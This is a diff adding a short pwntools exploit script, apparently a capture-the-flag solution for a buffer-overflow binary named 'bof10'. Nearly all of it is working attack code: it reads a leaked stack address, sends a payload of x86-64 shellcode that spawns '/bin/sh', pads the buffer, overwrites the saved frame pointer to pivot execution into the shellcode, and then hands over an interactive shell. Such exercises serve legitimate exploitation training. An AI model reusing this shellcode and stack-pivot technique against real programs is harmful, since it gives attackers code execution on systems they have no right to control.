@@ -1,0 +1,22 @@
+from pwn import *
+
+# scanf func auto add a b'\x00' at the end of buf, can use to overwrite
+
+p = process("./bof10")
+
+p.sendlineafter(b"Your name: ", b"vani5hing")
+p.recvuntil(b"for you: ")
+stack_addr = int(p.recvline(), 16)
+
+shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
+rbp_func = stack_addr - 0x10
+rsp_func = rbp_func - 0x200
+rbp_fake = rbp_func - (rbp_func & 0xff)
+
+payload = shellcode + b'A' * (rbp_fake - rsp_func - len(shellcode)) + p64(rbp_fake) + p64(rsp_func)
+payload = payload.ljust(512, b'A')
+p.sendafter(b"Say something: ", payload)
+
+print(hex(stack_addr))
+
+p.interactive()
